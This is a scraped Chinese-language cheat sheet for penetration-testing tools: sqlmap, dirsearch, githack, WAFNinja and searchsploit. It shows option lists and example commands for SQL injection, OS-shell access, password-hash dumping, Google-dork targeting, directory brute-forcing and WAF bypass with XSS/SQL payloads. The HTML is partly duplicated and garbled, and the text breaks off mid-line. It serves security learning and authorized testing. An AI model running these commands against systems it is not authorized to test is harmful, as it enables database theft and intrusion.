-d-DELAY-每个请求的等待时间。默认是0秒-o-OUTPUT-FILE-保存输出到html-文件—proxy-PROXY-使用代理；Use-a-proxy-Format-IP-PORT—prefix-PROXY-增加前缀；Add-a-prefix-to-every-fuzz-—postfix-PROXY-增加postfix；Add-a-postfix-to-every-fuzz-w-WAF-发送特定WAF的有效载荷；Send-payloads-of-certain-WAF-default-generic-e-EXPECTED-目标站点的预期输出。如果输入是编码的或类似的，请使用此选项。-p-PATH-sqlite数据库的路径。默认位置为“db-db-sqlite”-searchsploithttps-www-exploit-db-com-searchsploit语法Usage-searchsploit-options-term1-term2-…-termN" class="headerlink" title="sqlmap简介sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。### sqlmap常用命令### Target：### Request### Optimization### Injection### Detectiong### Techniques### Fingerprint-f 查询目标DBMS版本指纹信息### Emuneration### Brute force### File system access### General### sqlmap注入技术简介### sqlmap获取目标方式## dirsearchpython dirsearch.py -u http://xxxx &#x2F;&#x2F;日常使用python dirsearch.py -u http://xxxx -r &#x2F;&#x2F;递归扫描，不过容易被检测python dirsearch.py -u http://xxxx -r -t 30 &#x2F;&#x2F;线程控制请求速率python dirsearch.py -u http://xxxx -r -t 30 –proxy 127.0.0.1:8080 &#x2F;&#x2F;使用代理### 安装及简单使用pip3 install -r requirements.txt # 安装下需要的依赖python3 dirsearch.py -u [target_url] # 攻击目标url地址，可以用 -u 参数指定多个### 命令参数这个脚本很多功能参数，但能用到的可能比较少，几乎都有默认配置，在 default.conf 中可以看到### 版本以及帮助命令–version 显示程序版本号并退出-h 显示帮助信息并退出### 常用命令参数-u 攻击目标url地址，可以指定多个，通过逗号分隔-l url列表文件，比如你可以建一个 targets.txt，里面包含需要攻击的网址-e 站点文件类型列表，如：php,asp，有默认配置：php,aspx,jsp,html,js，基本主流的格式都包含了-X 不需要扫描的站点文件类型列表-w 用指定爆破字典执行，若存在多个通过逗号分隔-t 指定线程数-i 仅现实指定的状态码，指定多个通过逗号分隔-x 不显示指定的状态码，指定多个通过逗号分隔–exclude-sizes&#x3D;SIZES 不显示的响应包大小（Example: 123B,4KB）–exclude-texts&#x3D;TEXTS 不显示的响应包关键字 (Example: “Not found”, “Error”）-m 指定请求方式，默认GET### 较为冷门配置–cidr&#x3D;CIDR 无类域间路由CIDR–prefixes&#x3D;PREFIXES 对字典中的每个项添加自定义前缀，比如字典中有个项是app，只要我指定 ~,+,&#x3D;，那么就会爆破的字典项为 ~app、+app、&#x3D;app，若存在多个通过逗号分隔–suffixes&#x3D;SUFFIXES 添加自定义后缀，同上若存在多个通过逗号分隔-U 字典全部大写-L 字典全部小写-C 首字母大写-d 指定HTTP request data-H 设置HTTP请求头，Example: -H “Referer: example.com” -H “Accept: &#x2F;“–random-user-agent&#x3D;true&#x2F;false 随机user-agent开关–user-agent&#x3D;USERAGENT 自定义用户凭证，比如 Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko&#x2F;20100101 Firefox&#x2F;97.0，可以伪造请求报文–cookie&#x3D;COOKIE 可以设置访问cookie–exit-on-error 当出错直接关闭程序–timeout&#x3D;TIMEOUT 访问超时设置-s DELAY, –delay&#x3D;DELAY 请求间隔延迟&#x2F;s，支持浮点数 Delay between requests (support float number)–proxy&#x3D;PROXY 指定访问代理，例如: localhost:8080, socks5:&#x2F;&#x2F;localhost:8088)### 输出报告格式–simple-report&#x3D;OUTPUTFILE 简洁报告–plain-text-report&#x3D;OUTPUTFILE 纯文本格式报告–json-report&#x3D;OUTPUTFILE json格式报告–xml-report&#x3D;OUTPUTFILE xml格式报告–markdown-report&#x3D;OUTPUTFILE markdown格式报告## githackpython2 githack.py  https://example.com/.git/## wafninja基于python2python wafninja.py fuzz -h # 我们可以把fuzz 换成 bypass,insert-fuzz,insert-bypass,set-db 这几个关键词，便可以查看相对应的帮助信息。### Fuzz是什么？Generally speaking fuzz is a brute force method which used to break software，就是用大量的测试用例一个一个试，尽可能多的找出有可能出问题的地方。bypass就是绕过。### 使用示例fuzz（模糊测试）:python wafninja.py fuzz -u “http://www.target.com/index.php?id=FUZZ“ -c “phpsessid&#x3D;value” -t xss -o output.htmlbypass（绕过WAF）:python wafninja.py bypass -u “http://www.target.com/index.php“ -p “Name&#x3D;PAYLOAD&amp;Submit&#x3D;Submit” -c “phpsessid&#x3D;value” -t xss -o output.htmlinsert-fuzz（用户自定义模糊测试载荷）:python wafninja.py insert-fuzz -i select -e select -t sql### 参数介绍其他参数：{fuzz,bypass,insert-fuzz,insert-bypass,set-db}fuzz 检查WAF允许通过的符号和关键词。.bypass 从数据库中发送载荷到目标。insert-fuzz 添加一个模糊字符串。insert-bypass 添加一个载荷到绕过列表。set-db 设置另外一个数据库文件。对于别人分享的相同载荷数据库时，这个特别有用。可选参数：-h, —help 显示帮助信息并且退出。-u URL 目标URL（例如： “www.target.com/index.php?id=FUZZ”)注意：用关键词FUZZ来指定模糊测试的位置。-p POST PARAMETER 通过post参数发送模糊测试载荷 Send fuzz through post parameter-c COOKIE HTTP Cookie 头部-t TYPE 载荷的类型 [sql|xss]-d DELAY 每个请求的等待时间。默认是0秒-o OUTPUT FILE 保存输出到html 文件—proxy PROXY 使用代理；Use a proxy. Format: IP:PORT—prefix PROXY 增加前缀；Add a prefix to every fuzz.—postfix PROXY 增加postfix；Add a postfix to every fuzz.-w WAF 发送特定WAF的有效载荷；Send payloads of certain WAF [default&#x3D;generic]-e EXPECTED 目标站点的预期输出。如果输入是编码的或类似的，请使用此选项。-p PATH sqlite数据库的路径。默认位置为“db&#x2F;db.sqlite”## searchsploithttps://www.exploit-db.com/searchsploit语法Usage: searchsploit [options] term1 [term2] … [termN]"></a>sqlmap简介<br>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。<br>### sqlmap常用命令<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-h 显示基本帮助信息</span><br><span class="line">-hh 显示高级帮助信息</span><br><span class="line">--version 显示版本号</span><br><span class="line">-v 详细等级（0-6 默认 1）</span><br><span class="line">0：只显示python错误以及重要信息</span><br><span class="line">1：显示信息以及警告</span><br><span class="line">2：显示debug消息</span><br><span class="line">3：显示注入payload</span><br><span class="line">4：显示http请求</span><br><span class="line">5：显示http响应头·</span><br><span class="line">6：显示http响应内容</span><br></pre></td></tr></table></figure><br>### Target：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-u 指定目标url</span><br><span class="line">-d 直接连接数据库</span><br><span class="line">-l 从burp代理日志的解析目标</span><br><span class="line">-r 从文件中加载http请求</span><br><span class="line">-g 从google dork的结果作为目标url</span><br><span class="line">-c 从INI配置文件中加载选项</span><br></pre></td></tr></table></figure><br>### Request<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">-A 指定user-agent头</span><br><span class="line">-H 额外的header</span><br><span class="line">-method= 指定HTTP方法（GET/POST）</span><br><span class="line">--data= 通过POST提交数据 </span><br><span class="line">--param-del= 指定参数分隔符</span><br><span class="line">--cookie= 指定cookie的值</span><br><span class="line">--cookie-del= 指定cookie分隔符</span><br><span class="line">--drop-set-cookie 扔掉response中的set-cookie头</span><br><span class="line">--random-agent 使用随机的user-agent头</span><br><span class="line">--host= 设置host头 </span><br><span class="line">--referer= 指定referer头</span><br><span class="line">--headers= 额外的headers</span><br><span class="line">--auth-type= http认证类型（Basic，NTLM，Digest）</span><br><span class="line">--auith-cred= http认证凭证（账号：密码）</span><br><span class="line">--ignore-proxy 忽略系统代理（常用于扫描本地文件）</span><br><span class="line">--proxy= 使用代理</span><br><span class="line">--proxy-cred= 代理认证证书（账号：密码）</span><br><span class="line">--delay= 设置延迟时间（两个请求之间）</span><br><span class="line">--timeout= 超时时来连接前等待（默认 30）</span><br><span class="line">--retries= 连接超时时重试次数（默认 3）</span><br><span class="line">--randomize= 随机更改指定的参数的值</span><br><span class="line">--safe-url= 在测试期间经常访问的URL</span><br><span class="line">--safe-post= POST数据发送到安全的URL</span><br><span class="line">--safe-freq= 两次请求之间穿插一个安全的URL </span><br><span class="line">--skip-urlencode 跳过payload数据的URL编码</span><br><span class="line">--chunked 使用HTTP分块传输加密POST请求</span><br><span class="line">--hpp 使用HTTP参数pollution方法（常用于绕过IPS/IDS检测）</span><br><span class="line">--force-ssl 强制使用SSL/HTTPS</span><br><span class="line">--eval=value 请求之前提供Python代码（eg：&quot;import hashlib;id2=hashlib.md5(id).hexdigest()&quot;）</span><br></pre></td></tr></table></figure><br>### Optimization<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-o 打开所有优化开关</span><br><span class="line">--predict-output 预测输出（与--threads不兼容）</span><br><span class="line">--keep-alive 建立长久的HTTP(S)连接 (与--proxy不兼容)</span><br><span class="line">--null-connection 空连接</span><br><span class="line">--threads=value 设置线程(默认 1)</span><br></pre></td></tr></table></figure><br>### Injection<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">-p 指定测试参数</span><br><span class="line">--skip= 跳过指定参数的测试</span><br><span class="line">--skip-static 跳过测试静态的参数</span><br><span class="line">--dbms= 指定具体DBMS</span><br><span class="line">--os= 指定DBMS操作系统</span><br><span class="line">--invalid-bignum 使用大数字使值无效</span><br><span class="line">--invalid-logical 使用逻辑符使值无效</span><br><span class="line">--invalid-string 使用字符串使值无效</span><br><span class="line">--no-cast 关闭payload铸造机制</span><br><span class="line">--no-escape 关闭字符转义机制（默认自动开启）</span><br><span class="line">--prefix= 加入payload前缀</span><br><span class="line">--suffix= 加入payload后缀</span><br><span class="line">--tamper= 指定使用的脚本</span><br></pre></td></tr></table></figure><br>### Detectiong<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">--level= 指定测试的等级（1-5 默认为1）</span><br><span class="line">--risk= 指定测试的风险（0-3 默认为1）</span><br><span class="line">--string= 登录成功时，页面所含有的“关键字” 用于证明已经登录成功</span><br><span class="line">--not-string= 登录成功时，页面所含有的“关键字” 用于证明已经登录失败</span><br><span class="line">--code= 查询为真时，匹配的HTTP代码</span><br><span class="line">--smart 当有大量检测目标时，只选择基于错误的检测结果</span><br><span class="line">--text-only 仅基于文本内容比较网页</span><br><span class="line">--titles 仅基于标题比较网页</span><br></pre></td></tr></table></figure><br>### Techniques<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--technique= 指定sql注入技术（默认BEUSTQ）</span><br><span class="line">--time-sec= 基于时间注入检测相应的延迟时间（默认为5秒）</span><br><span class="line">--union-clos= 进行查询时，指定列的范围</span><br><span class="line">--union-char= 指定暴力破解列数的字符</span><br></pre></td></tr></table></figure><br>### Fingerprint<br>-f 查询目标DBMS版本指纹信息<br>### Emuneration<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">-a 查询所有 </span><br><span class="line">-b 查询目标DBMS banner信息</span><br><span class="line">--current-user 查询目标DBMS当前用户</span><br><span class="line">--current-db 查询目标DBMS当前数据库</span><br><span class="line">--is-dba 查询目标DBMS当前用户是否为DBA</span><br><span class="line">--users 枚举目标DBMS所有的用户</span><br><span class="line">--paswords 枚举目标DBMS用户密码哈希值</span><br><span class="line">--privileges 枚举目标DBMS用户的权限</span><br><span class="line">--roles 枚举DBMS用户的角色</span><br><span class="line">--dbs 枚举DBMS所有的数据库</span><br><span class="line">--tables 枚举DBMS数据库中所有的表</span><br><span class="line">--columns 枚举DBMS数据库表中所有的列</span><br><span class="line">--count 检索表的条目的数量</span><br><span class="line">--dump 存储DBMS数据库的表中的条目</span><br><span class="line">--dump-all 存储DBMS所有数据库表中的条目</span><br><span class="line">--D db 指定进行枚举的数据库名称</span><br><span class="line">--T table 指定进行枚举的数据库表名称</span><br><span class="line">--C column 指定进行枚举的数据库列名称</span><br><span class="line">--exclude-sysdbs 枚举表时排除系统数据库</span><br><span class="line">--sql-query 指定查询的sql语句</span><br><span class="line">--sql-shell 提示输入一个交互式sql shell</span><br></pre></td></tr></table></figure><br>### Brute force<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--common-tables 暴力破解表 </span><br><span class="line">--common-colomns 暴力破解列</span><br></pre></td></tr></table></figure><br>### File system access<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">--file-read 从目标数据库管理文件系统读取文件</span><br><span class="line">--file-write 上传文件到目标数据库管理文件系统</span><br><span class="line">--file-dest 指定写入文件的绝对路径</span><br><span class="line">--os-cmd= 执行操作系统命令</span><br><span class="line">--os-shell 交互式的系统shell</span><br><span class="line">--os-pwn 获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line">--os-smbrelay 一键 获取一个OOB shell，Meterpreter或者VNC</span><br><span class="line">--os-bof 储存过程缓冲区溢出利用</span><br><span class="line">--os-esc 数据库进程用户权限提升</span><br><span class="line">--msf-path= Metasploit Framework本地安装路径</span><br></pre></td></tr></table></figure><br>### General<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">-s sqlite会话文件保存位置</span><br><span class="line">-t 记录所有HTTP流量到指定文件中</span><br><span class="line">--batch 测试过程中， 执行所有默认配置</span><br><span class="line">--charset=v 强制用于数据检索的字符编码 </span><br><span class="line">--crawl= 从目标URL开始爬取网站</span><br><span class="line">--crawl-exclude= 禁止爬取某个页面（eg：logout）</span><br><span class="line">--csv-del= 指定CSV输出中使用的的字符</span><br><span class="line">--dump-format= 储存数据的方式（CSV(default)，HTML，SQLITE）</span><br><span class="line">--flush-session 刷新当前目标的会话文件</span><br><span class="line">--fresh-queries 忽略会话文件中储存的查询结果，重新查询</span><br><span class="line">--hex 使用DBMS hex函数进行数据检索</span><br><span class="line">--outpout-dir= 自定义输出目录</span><br><span class="line">--save= 保存选项到INI配置文件中</span><br><span class="line">--scope= 使用正则表达式从提供的日志中guo&#x27;l</span><br><span class="line">--alert 再找到SQL注入时运行主机操作系统命令</span><br><span class="line">--purge-output 安全的从输出目录中删除所有内容</span><br><span class="line">--sqlmap-shell 提示输入交互式sqlmap shell</span><br><span class="line">--update 更新sqlmap</span><br></pre></td></tr></table></figure><br>### sqlmap注入技术简介<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--technique= （默认全部使用）</span><br><span class="line">B 基于布尔的盲注</span><br><span class="line">T 基于时间的盲注</span><br><span class="line">E 基于报错的注入</span><br><span class="line">U 基于UNION查询注入</span><br><span class="line">S 基于多语句查询注入</span><br></pre></td></tr></table></figure><br>### sqlmap获取目标方式<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1.指定目标url</span><br><span class="line">sqlmap -u &quot;http:/192.168.3.2/sqli-labs-master/sqli-labs-master/Less-1/?id=1&quot;</span><br><span class="line">2.从文件中获取多个url</span><br><span class="line">sqlmap -m 1.txt</span><br><span class="line">3.从文件中加载HTTP请求</span><br><span class="line">sqlmap -r url.txt</span><br><span class="line">4.利用google获取目标</span><br><span class="line">sqlmap -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</span><br><span class="line">5.从burp日志中获取目标</span><br><span class="line">sqlmap -l burp.txt </span><br></pre></td></tr></table></figure><br>## dirsearch<br>python dirsearch.py -u <a href="http://xxxx/">http://xxxx</a> &#x2F;&#x2F;日常使用<br>python dirsearch.py -u <a href="http://xxxx/">http://xxxx</a> -r &#x2F;&#x2F;递归扫描，不过容易被检测<br>python dirsearch.py -u <a href="http://xxxx/">http://xxxx</a> -r -t 30 &#x2F;&#x2F;线程控制请求速率<br>python dirsearch.py -u <a href="http://xxxx/">http://xxxx</a> -r -t 30 –proxy 127.0.0.1:8080 &#x2F;&#x2F;使用代理<br>### 安装及简单使用<br>pip3 install -r requirements.txt # 安装下需要的依赖<br>python3 dirsearch.py -u [target_url] # 攻击目标url地址，可以用 -u 参数指定多个<br>### 命令参数<br>这个脚本很多功能参数，但能用到的可能比较少，几乎都有默认配置，在 default.conf 中可以看到<br>### 版本以及帮助命令<br>–version 显示程序版本号并退出<br>-h 显示帮助信息并退出<br>### 常用命令参数<br>-u 攻击目标url地址，可以指定多个，通过逗号分隔<br>-l url列表文件，比如你可以建一个 targets.txt，里面包含需要攻击的网址<br>-e 站点文件类型列表，如：php,asp，有默认配置：php,aspx,jsp,html,js，基本主流的格式都包含了<br>-X 不需要扫描的站点文件类型列表<br>-w 用指定爆破字典执行，若存在多个通过逗号分隔<br>-t 指定线程数<br>-i 仅现实指定的状态码，指定多个通过逗号分隔<br>-x 不显示指定的状态码，指定多个通过逗号分隔<br>–exclude-sizes&#x3D;SIZES 不显示的响应包大小（Example: 123B,4KB）<br>–exclude-texts&#x3D;TEXTS 不显示的响应包关键字 (Example: “Not found”, “Error”）<br>-m 指定请求方式，默认GET<br>### 较为冷门配置<br>–cidr&#x3D;CIDR 无类域间路由CIDR<br>–prefixes&#x3D;PREFIXES 对字典中的每个项添加自定义前缀，比如字典中有个项是app，只要我指定 ~,+,&#x3D;，那么就会爆破的字典项为 ~app、+app、&#x3D;app，若存在多个通过逗号分隔<br>–suffixes&#x3D;SUFFIXES 添加自定义后缀，同上若存在多个通过逗号分隔<br>-U 字典全部大写<br>-L 字典全部小写<br>-C 首字母大写<br>-d 指定HTTP request data<br>-H 设置HTTP请求头，Example: -H “Referer: example.com” -H “Accept: <em>&#x2F;</em>“<br>–random-user-agent&#x3D;true&#x2F;false 随机user-agent开关<br>–user-agent&#x3D;USERAGENT 自定义用户凭证，比如 Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko&#x2F;20100101 Firefox&#x2F;97.0，可以伪造请求报文<br>–cookie&#x3D;COOKIE 可以设置访问cookie<br>–exit-on-error 当出错直接关闭程序<br>–timeout&#x3D;TIMEOUT 访问超时设置<br>-s DELAY, –delay&#x3D;DELAY 请求间隔延迟&#x2F;s，支持浮点数 Delay between requests (support float number)<br>–proxy&#x3D;PROXY 指定访问代理，例如: localhost:8080, socks5:&#x2F;&#x2F;localhost:8088)<br>### 输出报告格式<br>–simple-report&#x3D;OUTPUTFILE 简洁报告<br>–plain-text-report&#x3D;OUTPUTFILE 纯文本格式报告<br>–json-report&#x3D;OUTPUTFILE json格式报告<br>–xml-report&#x3D;OUTPUTFILE xml格式报告<br>–markdown-report&#x3D;OUTPUTFILE markdown格式报告<br>## githack<br>python2 githack.py  <a href="https://example.com/.git/">https://example.com/.git/</a><br>## wafninja<br>基于python2<br>python wafninja.py fuzz -h # 我们可以把fuzz 换成 bypass,insert-fuzz,insert-bypass,set-db 这几个关键词，便可以查看相对应的帮助信息。<br>### Fuzz是什么？<br>Generally speaking fuzz is a brute force method which used to break software，就是用大量的测试用例一个一个试，尽可能多的找出有可能出问题的地方。<br>bypass就是绕过。<br>### 使用示例<br>fuzz（模糊测试）:<br>python wafninja.py fuzz -u “<a href="http://www.target.com/index.php?id=FUZZ%E2%80%9C">http://www.target.com/index.php?id=FUZZ“</a> -c “phpsessid&#x3D;value” -t xss -o output.html<br>bypass（绕过WAF）:python wafninja.py bypass -u “<a href="http://www.target.com/index.php%E2%80%9C">http://www.target.com/index.php“</a> -p “Name&#x3D;PAYLOAD&amp;Submit&#x3D;Submit” -c “phpsessid&#x3D;value” -t xss -o output.html<br>insert-fuzz（用户自定义模糊测试载荷）:python wafninja.py insert-fuzz -i select -e select -t sql<br>### 参数介绍<br>其他参数：{fuzz,bypass,insert-fuzz,insert-bypass,set-db}fuzz 检查WAF允许通过的符号和关键词。.bypass 从数据库中发送载荷到目标。insert-fuzz 添加一个模糊字符串。insert-bypass 添加一个载荷到绕过列表。set-db 设置另外一个数据库文件。对于别人分享的相同载荷数据库时，这个特别有用。<br>可选参数：-h, —help 显示帮助信息并且退出。-u URL 目标URL（例如： “<a href="http://www.target.com/index.php?id=FUZZ%E2%80%9D)%E6%B3%A8%E6%84%8F%EF%BC%9A%E7%94%A8%E5%85%B3%E9%94%AE%E8%AF%8DFUZZ%E6%9D%A5%E6%8C%87%E5%AE%9A%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95%E7%9A%84%E4%BD%8D%E7%BD%AE%E3%80%82-p">www.target.com/index.php?id=FUZZ”)注意：用关键词FUZZ来指定模糊测试的位置。-p</a> POST PARAMETER 通过post参数发送模糊测试载荷 Send fuzz through post parameter-c COOKIE HTTP Cookie 头部-t TYPE 载荷的类型 [sql|xss]-d DELAY 每个请求的等待时间。默认是0秒-o OUTPUT FILE 保存输出到html 文件—proxy PROXY 使用代理；Use a proxy. Format: IP:PORT—prefix PROXY 增加前缀；Add a prefix to every fuzz.—postfix PROXY 增加postfix；Add a postfix to every fuzz.-w WAF 发送特定WAF的有效载荷；Send payloads of certain WAF [default&#x3D;generic]-e EXPECTED 目标站点的预期输出。如果输入是编码的或类似的，请使用此选项。-p PATH sqlite数据库的路径。默认位置为“db&#x2F;db.sqlite”<br>## searchsploit<br><a href="https://www.exploit-db.com/searchsploit">https://www.exploit-db.com/searchsploit</a><br>语法<br>Usage: searchsploit [options] term1 [term2] … [termN]</h1><h1 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h1><h1 id="searchsploit-afd-windows-localsearchsploit-t-oracle-windowssearchsploit-p-39446searchsploit-linux-kernel-3-2-–exclude-”-PoC-dos-“For-more-examples-see-the-manual-https-www-exploit-db-com-searchsploit"><a href="#searchsploit-afd-windows-localsearchsploit-t-oracle-windowssearchsploit-p-39446searchsploit-linux-kernel-3-2-–exclude-”-PoC-dos-“For-more-examples-see-the-manual-https-www-exploit-db-com-searchsploit" class="headerlink" title="searchsploit afd windows localsearchsploit -t oracle windowssearchsploit -p 39446searchsploit linux kernel 3.2 –exclude&#x3D;”(PoC)|&#x2F;dos&#x2F;“For more examples, see the manual: https://www.exploit-db.com/searchsploit/"></a>searchsploit afd windows local<br>searchsploit -t oracle windows<br>searchsploit -p 39446<br>searchsploit linux kernel 3.2 –exclude&#x3D;”(PoC)|&#x2F;dos&#x2F;“<br>For more examples, see the manual: <a href="https://www.exploit-db.com/searchsploit/">https://www.exploit-db.com/searchsploit/</a></h1><h1 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h1><h1 id="c-–case-Term-区分大小写-默认不区分大小写-e-–exact-Term-对exploit标题进行EXACT匹配-默认为-AND-Implies-“-t”-h-–help-显示帮助-j-–json-Term-以JSON格式显示结果-m-–mirror-EDB-ID-把一个exp拷贝到当前工作目录-参数后加目标id-o-–overflow-Term-Exploit标题被允许溢出其列-p-–path-EDB-ID-显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号-t-–title-Term-仅仅搜索漏洞标题（默认是标题和文件的路径）-u-–update-检查并安装任何exploitdb软件包更新（deb或git）-w-–www-Term-显示Exploit-DB-com的URL而不是本地路径（在线搜索）-x-–examine-EDB-ID-使用-PAGER检查（副本）Exp–colour-搜索结果不高亮显示关键词–id-显示EDB-ID–nmap-file-xml-使用服务版本检查Nmap-XML输出中的所有结果（例如：nmap-sV-oX-file-xml）使用“-v”（详细）来尝试更多的组合–exclude-”term”-从结果中删除值。通过使用“-”分隔多个值例如–exclude-“term1-term2-term3”。"><a href="#c-–case-Term-区分大小写-默认不区分大小写-e-–exact-Term-对exploit标题进行EXACT匹配-默认为-AND-Implies-“-t”-h-–help-显示帮助-j-–json-Term-以JSON格式显示结果-m-–mirror-EDB-ID-把一个exp拷贝到当前工作目录-参数后加目标id-o-–overflow-Term-Exploit标题被允许溢出其列-p-–path-EDB-ID-显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号-t-–title-Term-仅仅搜索漏洞标题（默认是标题和文件的路径）-u-–update-检查并安装任何exploitdb软件包更新（deb或git）-w-–www-Term-显示Exploit-DB-com的URL而不是本地路径（在线搜索）-x-–examine-EDB-ID-使用-PAGER检查（副本）Exp–colour-搜索结果不高亮显示关键词–id-显示EDB-ID–nmap-file-xml-使用服务版本检查Nmap-XML输出中的所有结果（例如：nmap-sV-oX-file-xml）使用“-v”（详细）来尝试更多的组合–exclude-”term”-从结果中删除值。通过使用“-”分隔多个值例如–exclude-“term1-term2-term3”。" class="headerlink" title="-c, –case [Term] 区分大小写(默认不区分大小写)-e, –exact [Term] 对exploit标题进行EXACT匹配 (默认为 AND) [Implies “-t”].-h, –help 显示帮助-j, –json [Term] 以JSON格式显示结果-m, –mirror [EDB-ID] 把一个exp拷贝到当前工作目录,参数后加目标id-o, –overflow [Term] Exploit标题被允许溢出其列-p, –path [EDB-ID] 显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号-t, –title [Term] 仅仅搜索漏洞标题（默认是标题和文件的路径）-u, –update 检查并安装任何exploitdb软件包更新（deb或git）-w, –www [Term] 显示Exploit-DB.com的URL而不是本地路径（在线搜索）-x, –examine [EDB-ID] 使用$ PAGER检查（副本）Exp–colour 搜索结果不高亮显示关键词–id 显示EDB-ID–nmap [file.xml] 使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）使用“-v”（详细）来尝试更多的组合–exclude&#x3D;”term” 从结果中删除值。通过使用“|”分隔多个值例如–exclude&#x3D;“term1 | term2 | term3”。"></a>-c, –case [Term] 区分大小写(默认不区分大小写)<br>-e, –exact [Term] 对exploit标题进行EXACT匹配 (默认为 AND) [Implies “-t”].<br>-h, –help 显示帮助<br>-j, –json [Term] 以JSON格式显示结果<br>-m, –mirror [EDB-ID] 把一个exp拷贝到当前工作目录,参数后加目标id<br>-o, –overflow [Term] Exploit标题被允许溢出其列<br>-p, –path [EDB-ID] 显示漏洞利用的完整路径（如果可能，还将路径复制到剪贴板），后面跟漏洞ID号<br>-t, –title [Term] 仅仅搜索漏洞标题（默认是标题和文件的路径）<br>-u, –update 检查并安装任何exploitdb软件包更新（deb或git）<br>-w, –www [Term] 显示Exploit-DB.com的URL而不是本地路径（在线搜索）<br>-x, –examine [EDB-ID] 使用$ PAGER检查（副本）Exp<br>–colour 搜索结果不高亮显示关键词<br>–id 显示EDB-ID<br>–nmap [file.xml] 使用服务版本检查Nmap XML输出中的所有结果（例如：nmap -sV -oX file.xml）<br>使用“-v”（详细）来尝试更多的组合<br>–exclude&#x3D;”term” 从结果中删除值。通过使用“|”分隔多个值<br>例如–exclude&#x3D;“term1 | term2 | 